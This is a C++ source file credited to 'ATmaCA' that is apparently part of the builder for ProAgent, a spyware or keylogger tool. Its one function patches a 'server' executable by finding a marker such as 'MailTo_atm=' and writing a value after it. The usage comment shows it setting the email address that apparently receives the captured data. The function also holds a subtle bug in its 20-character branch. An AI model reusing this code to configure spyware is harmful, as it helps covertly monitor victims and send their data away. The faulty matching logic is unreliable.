/*===================================
ProAgent coded By ATmaCA
http://www.atmacasoft.com
atmaca@prohack.net
===================================*/
//Kullanim Sekli
//if(Editle("C:\\deneme.exe","MailTo_atm=","yagizhanatmaca@hotmail.com"))
//ShowMessage("Basari ile yazildi.");
bool Editle(AnsiString ServerPath,AnsiString Ayar,AnsiString Deger)
{

FILE *di1;
int Size=Ayar.Length();
int adres=0;
char *kr1 = new char[2000000];
char kr2;
int i1=0;
if((di1=fopen(ServerPath.c_str(),"r+b")) == NULL)
{
delete [] kr1;
return false;
}
  while(!feof(di1))
    {
    kr1[i1]=getc(di1);
    i1++;
    };   rewind(di1);
    i1=0;


    //ShowMessage(Size);
    if(Size==5)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  )
                 {
                   adres=i1;//bulunan adres
                   break;
                 } i1++;
             };
       //=================================================================
    }
    if(Size==6)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);


               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4] && kr1[i1+5]==Ayar.c_str()[5]  )
                 {
                   adres=i1;//bulunan adres
                   break;
                 } i1++;
             };
       //=================================================================
    }
    if(Size==7)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6])
                 {
                   adres=i1;//bulunan adres
                   break;
                 }  i1++;
             };
       //=================================================================
    }
    if(Size==8)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] )
                 {
                   adres=i1;//bulunan adres
                   break;
                 }     i1++;
             };
       //=================================================================
    }
    if(Size==9)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8])
                 {
                   adres=i1;//bulunan adres
                   break;
                 }   i1++;
             };
       //=================================================================
    }
    if(Size==10)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8] && kr1[i1+9]==Ayar.c_str()[9])
                 {
                   adres=i1;//bulunan adres
                   break;
                 }    i1++;
             };
       //=================================================================
    }
    if(Size==11)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8] && kr1[i1+9]==Ayar.c_str()[9] && kr1[i1+10]==Ayar.c_str()[10])
                 {
                   adres=i1;//bulunan adres
                   break;
                 }   i1++;
             };
       //=================================================================
    }
    if(Size==12)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8] && kr1[i1+9]==Ayar.c_str()[9] && kr1[i1+10]==Ayar.c_str()[10] && kr1[i1+11]==Ayar.c_str()[11])
                 {
                   adres=i1;//bulunan adres
                   break;
                 }     i1++;
             };
       //=================================================================
    }
    if(Size==13)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8] && kr1[i1+9]==Ayar.c_str()[9] && kr1[i1+10]==Ayar.c_str()[10] && kr1[i1+11]==Ayar.c_str()[11] && kr1[i1+12]==Ayar.c_str()[12])
                 {
                   adres=i1;//bulunan adres
                   break;
                 }     i1++;
             };
       //=================================================================
    }
    if(Size==14)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8] && kr1[i1+9]==Ayar.c_str()[9] && kr1[i1+10]==Ayar.c_str()[10] && kr1[i1+11]==Ayar.c_str()[11] && kr1[i1+12]==Ayar.c_str()[12] && kr1[i1+13]==Ayar.c_str()[13])
                 {
                   adres=i1;//bulunan adres
                   break;
                 }     i1++;
             };
       //=================================================================
    }
    if(Size==15)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8] && kr1[i1+9]==Ayar.c_str()[9] && kr1[i1+10]==Ayar.c_str()[10] && kr1[i1+11]==Ayar.c_str()[11] && kr1[i1+12]==Ayar.c_str()[12] && kr1[i1+13]==Ayar.c_str()[13] && kr1[i1+14]==Ayar.c_str()[14])
                 {
                   adres=i1;//bulunan adres
                   break;
                 }    i1++;
             };
       //=================================================================
    }
    if(Size==16)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8] && kr1[i1+9]==Ayar.c_str()[9] && kr1[i1+10]==Ayar.c_str()[10] && kr1[i1+11]==Ayar.c_str()[11] && kr1[i1+12]==Ayar.c_str()[12] && kr1[i1+13]==Ayar.c_str()[13] && kr1[i1+14]==Ayar.c_str()[14] && kr1[i1+15]==Ayar.c_str()[15] )
                 {
                   adres=i1;//bulunan adres
                   break;
                 }      i1++;
             };
       //=================================================================
    }
    if(Size==17)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8] && kr1[i1+9]==Ayar.c_str()[9] && kr1[i1+10]==Ayar.c_str()[10] && kr1[i1+11]==Ayar.c_str()[11] && kr1[i1+12]==Ayar.c_str()[12] && kr1[i1+13]==Ayar.c_str()[13] && kr1[i1+14]==Ayar.c_str()[14] && kr1[i1+15]==Ayar.c_str()[15] && kr1[i1+16]==Ayar.c_str()[16] )
                 {
                   adres=i1;//bulunan adres
                   break;
                 }      i1++;
             };
       //=================================================================
    }
    if(Size==18)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8] && kr1[i1+9]==Ayar.c_str()[9] && kr1[i1+10]==Ayar.c_str()[10] && kr1[i1+11]==Ayar.c_str()[11] && kr1[i1+12]==Ayar.c_str()[12] && kr1[i1+13]==Ayar.c_str()[13] && kr1[i1+14]==Ayar.c_str()[14] && kr1[i1+15]==Ayar.c_str()[15] && kr1[i1+16]==Ayar.c_str()[16] && kr1[i1+17]==Ayar.c_str()[17] )
                 {
                   adres=i1;//bulunan adres
                   break;
                 }     i1++;
             };
       //=================================================================
    }
    if(Size==19)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8] && kr1[i1+9]==Ayar.c_str()[9] && kr1[i1+10]==Ayar.c_str()[10] && kr1[i1+11]==Ayar.c_str()[11] && kr1[i1+12]==Ayar.c_str()[12] && kr1[i1+13]==Ayar.c_str()[13] && kr1[i1+14]==Ayar.c_str()[14] && kr1[i1+15]==Ayar.c_str()[15] && kr1[i1+16]==Ayar.c_str()[16] && kr1[i1+17]==Ayar.c_str()[17] && kr1[i1+18]==Ayar.c_str()[18] )
                 {
                   adres=i1;//bulunan adres
                   break;
                 }    i1++;
             };
       //=================================================================
    }
    if(Size==20)
    {
        //=================================================================
        while(!feof(di1))
             {
               kr2=getc(di1);
               if( kr1[i1]==Ayar.c_str()[0] && kr1[i1+1]==Ayar.c_str()[1] && kr1[i1+2]==Ayar.c_str()[2] && kr1[i1+3]==Ayar.c_str()[3] && kr1[i1+4]==Ayar.c_str()[4]  && kr1[i1+5]==Ayar.c_str()[5] && kr1[i1+6]==Ayar.c_str()[6] && kr1[i1+7]==Ayar.c_str()[7] && kr1[i1+8]==Ayar.c_str()[8] && kr1[i1+9]==Ayar.c_str()[9] && kr1[i1+10]==Ayar.c_str()[10] && kr1[i1+11]==Ayar.c_str()[11] && kr1[i1+12]==Ayar.c_str()[12] && kr1[i1+13]==Ayar.c_str()[13] && kr1[i1+14]==Ayar.c_str()[14] && kr1[i1+15]==Ayar.c_str()[15] && kr1[i1+16]==Ayar.c_str()[16] && kr1[i1+17]==Ayar.c_str()[17] && kr1[i1+18]==Ayar.c_str()[18] && kr1[i1+18]==Ayar.c_str()[19] )
                 {
                   adres=i1;//bulunan adres
                   break;
                 }     i1++;
             };
       //=================================================================
    }

if(adres!=0)
  {
    rewind(di1);
    fseek(di1,adres+Size,0);
    fprintf(di1,"%s",Deger.c_str());
    fclose(di1);
    delete [] kr1;
    return true;
  }
  else
      {
      fclose(di1);
      delete [] kr1;
      return false;
      } 
}